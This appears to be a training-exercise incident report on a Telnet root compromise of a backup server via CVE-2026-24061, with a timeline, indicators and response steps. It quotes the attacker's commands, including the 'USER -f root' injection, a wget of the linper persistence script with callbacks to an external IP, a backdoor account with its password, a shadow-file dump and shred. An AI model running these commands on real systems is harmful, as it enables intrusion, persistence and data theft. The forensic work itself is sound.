

By filtering for telnet packets and following tcp flows We observed the payload User -f root in ntcp frazgements from the ip *192.168.72.131* to *192.168.72.136*

A little reearch tell that it is an identified cve CVE-2026-24061

Victim hostname: *backup-secondary*

------

# Incident Report — `backup-secondary` Compromise

**Date of incident:** 27 January 2026 **Affected asset:** `backup-secondary` (192.168.72.136) **Source of evidence:** TCP stream capture of Telnet session `192.168.72.131 → 192.168.72.136` **Report date:** [fill in] **Analyst:** [fill in]

---

## Executive Summary

On **27 January 2026**, between approximately **10:39 and 10:53 UTC**, an unauthorised actor gained **unauthenticated root access** to the `backup-secondary` server (192.168.72.136) and conducted a complete intrusion lifecycle in under fifteen minutes. The activity culminated in the **exfiltration of a sensitive database** (`credit-cards-25-blackfriday.db`) and the **establishment of long-term persistence** beaconing to an external host.

**Access vector.** Initial access was achieved by exploiting **CVE-2026-24061**, a Telnet daemon vulnerability that permits unauthenticated root login by injecting `USER -f root` into the protocol's environment exchange. No credentials were used. The exploit payload originated from `192.168.72.131`, an attacker-controlled internal host. **Every system on the estate running the same vulnerable telnetd version is equally exposed** and must be patched or have Telnet disabled as an immediate priority.

**Impact.** A 12 KB file named `credit-cards-25-blackfriday.db`, located in `/opt`, was copied to the attacker's host via an ad-hoc HTTP server on port `6932`. The naming convention is consistent with **payment card data**, and the loss must be treated as a **PCI-DSS reportable event** until file contents are confirmed from backup. The source file was subsequently destroyed with `shred`, eliminating local recovery.

**Persistence.** The attacker downloaded the public tool **`linper`** and deployed it in stealth mode, installing **callback persistence to `91.99.25.54:59`** through seven execution methods (awk, bash, nc, perl, pwsh, python3, telnet) across five distinct system locations (root crontab, `/etc/crontab`, `/etc/cron.d/`, `/etc/systemd/`, `/etc/rc.local`). All modifications were **timestomped**, meaning standard mtime-based triage will not detect them. The host must be considered **fully compromised and not safely remediable in place**.

**Secondary access.** A local account **`cleanupsvc`** (password `YouKnowWhoiam69`) was created during the session as a disguised service account. The legitimate account `cyberjunkie` was not modified.

**Anti-forensics.** Beyond timestomping and secure deletion, no further log clearing was attempted, suggesting the attacker relied on persistence outlasting detection rather than on full operational silence. Host artefacts (`auth.log`, `wtmp`, `bash_history`) should remain available to corroborate this report.

### Recommended immediate actions

1. **Isolate** `backup-secondary` from the network without rebooting, to preserve volatile state for memory capture.
2. **Patch CVE-2026-24061** estate-wide, or disable Telnet entirely and require SSH with key-based authentication.
3. **Block egress** to `91.99.25.54` and to `tcp/59` at perimeter and internal segmentation points.
4. **Hunt laterally** for the `cleanupsvc` account, the `linper.sh` artefact in `/tmp`, and any connection attempts to `91.99.25.54` across the estate.
5. **Engage PCI and legal** on the assumption the exfiltrated database contained cardholder data, pending content confirmation from backup.
6. **Rebuild, do not clean.** Persistence is too widely distributed and timestomped to remediate reliably; restore from a known-good backup predating `2026-01-26 14:05` (the original mtime of the targeted file, which precedes this session).

---

## Timeline of Events

_Times in UTC, 27 January 2026. Timestamps marked with `~` are inferred from command sequencing within the captured TCP stream and should be corroborated against host-side logs (`auth.log`, `journalctl`, `bash_history`, `wtmp`)._

|#|Time|Event|Evidence|MITRE ATT&CK|
|---|---|---|---|---|
|1|**10:39:28**|Unauthenticated remote root access to `backup-secondary` from `192.168.72.131` via **CVE-2026-24061** (Telnet `USER -f root` injection bypass)|TCP stream fragments `.131 → .136` containing `USER -f root` payload; resulting shell on `pts/1` with env `DISPLAY=kali:0.0`|T1190 — Exploit Public-Facing Application|
|2|~10:39–10:40|Initial recon: `id`, `ps`, `cd /root; ls -la`|Stream|T1033, T1057, T1083|
|3|~10:42|Backdoor account created: `useradd -m -s /bin/bash cleanupsvc` and `echo "cleanupsvc:YouKnowWhoiam69" \| chpasswd`|New `/etc/shadow` entry; yescrypt hash; age field 20480 = 2026-01-27|T1136.001 — Create Account: Local|
|4|~10:42|Credential dump: `cat /etc/shadow`|Full shadow file echoed in stream|T1003.008 — OS Credential Dumping: /etc/passwd and /etc/shadow|
|5|~10:43|Filesystem enumeration: `/`, `/media`, `/dev`, `/opt`|`ls -la` output|T1083 — File and Directory Discovery|
|6|~10:43|Sensitive file located: `/opt/credit-cards-25-blackfriday.db` (12 288 B, mtime 2026-01-26 14:05)|Directory listing|T1083|
|7|**10:44:31–32**|Persistence tool fetched: `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh` to `/tmp`|wget output (34 249 B)|T1105 — Ingress Tool Transfer|
|8|~10:45|`bash linper.sh --enum-defenses` — Tripwire enumeration (none found)|Tool output|T1518.001 — Security Software Discovery|
|9|~10:45–10:46|`bash linper.sh -i 91.99.25.54 -p 59 --stealth-mode` — multi-method persistence to `91.99.25.54:59` via awk, bash, nc, perl, pwsh, python3, telnet|Tool output: doors written to `/var/spool/cron/crontabs/root`, `/etc/crontab`, `/etc/cron.d/`, `/etc/systemd/`, `/etc/rc.local`|T1053.003 — Cron · T1543.002 — Systemd Service · T1037.004 — RC Scripts · T1571 — Non-Standard Port|
|10|~10:46|Timestomping of every modified persistence file|linper output: "Timestomped Door" per file|T1070.006 — Indicator Removal: Timestomp|
|11|~10:49|Exfil staging: `python3 -m http.server 6932` from `/opt`|"Serving HTTP on 0.0.0.0 port 6932"|T1071.001 — Web Protocols|
|12|**10:49:52**|Attacker host `192.168.72.131` reaches listener (`GET /` → 200)|HTTP server access log|—|
|13|**10:49:54**|**Exfiltration:** `192.168.72.131 — GET /credit-cards-25-blackfriday.db → 200`|HTTP server access log|T1048.003 — Exfil Over Unencrypted Non-C2 Protocol|
|14|~10:50|HTTP server stopped (`Ctrl+C`)|Stream|—|
|15|~10:53|Anti-forensics: `shred -u -z -n 4 -- credit-cards-25-blackfriday.db`|`ls -la /opt` confirms removal; `/opt` mtime updates to 10:53|T1070.004 — File Deletion|
|16|~10:53|Session terminated (`exit`)|Stream end|—|

---

## Indicators of Compromise

|Type|Value|Notes|
|---|---|---|
|CVE|CVE-2026-24061|Telnet `USER -f root` unauthenticated bypass — initial access|
|IPv4|`91.99.25.54`|External C2 / persistence callback|
|Port|`tcp/59`|Beacon destination port|
|IPv4|`192.168.72.131`|Internal attacker host (Kali); both exploit source and exfil destination|
|Account|`cleanupsvc` / `YouKnowWhoiam69`|Rogue local account, UID created 2026-01-27|
|URL|`https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`|Persistence framework source|
|File|`/tmp/linper.sh` (34 249 B)|Dropped tool|
|File|`/opt/credit-cards-25-blackfriday.db` (12 288 B)|Exfiltrated and shredded|
|Persistence paths|`/var/spool/cron/crontabs/root`, `/etc/crontab`, `/etc/cron.d/`, `/etc/systemd/`, `/etc/rc.local`|All timestomped — do not trust mtime|

---



> [! HINT]  
> A few things to internalise for your CDSA template — the exec summary is graded on whether a non-technical reader can answer four questions in under a minute:
> - **What happened?** (one sentence, with date and asset)
> - **What was the impact?** (data, systems, regulatory exposure)
> - **How did they get in?** (initial access, lead with the vector)
> - **What do we do now?** (3–6 prioritised actions, action verbs first)
>   
> Notice the structure above puts impact _before_ technical detail. Analysts instinctively want to lead with the cool persistence findings; managers want to know if customer data left the building. Lead with the loss, then explain how it stuck.
